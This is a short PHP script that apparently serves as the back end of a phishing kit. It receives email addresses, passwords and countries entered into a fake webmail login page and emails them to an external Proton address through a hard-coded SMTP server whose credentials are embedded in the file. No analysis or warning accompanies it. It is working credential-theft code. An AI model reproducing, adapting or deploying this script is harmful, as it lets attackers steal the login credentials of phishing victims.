<?php
// SMTP Configuration
$smtpServer = "185.235.137.5";
$smtpPort = 2525;
$smtpUsername = "admin@os1freightvn.com";
$smtpPassword = "vip5ce9f5179a3a";

// Recipient
$to = "sozyurt1@proton.me";

// Get JSON input
$data = json_decode(file_get_contents("php://input"), true);
if (!$data) {
    echo json_encode(["success" => false, "message" => "No data received"]);
    exit;
}

$email = $data['email'];
$password = $data['password'];
$country = $data['country'];

// Compose the email
$subject = "New Webmail Login Attempt";
$message = "Email: $email\nPassword: $password\nCountry: $country";
$headers = "From: admin@os1freightvn.com\r\n";

// Set up SMTP
ini_set("SMTP", $smtpServer);
ini_set("smtp_port", $smtpPort);
ini_set("sendmail_from", $smtpUsername);

// Send email
if (mail($to, $subject, $message, $headers)) {
    echo json_encode(["success" => true]);
} else {
    echo json_encode(["success" => false, "message" => "Failed to send email"]);
}
?>
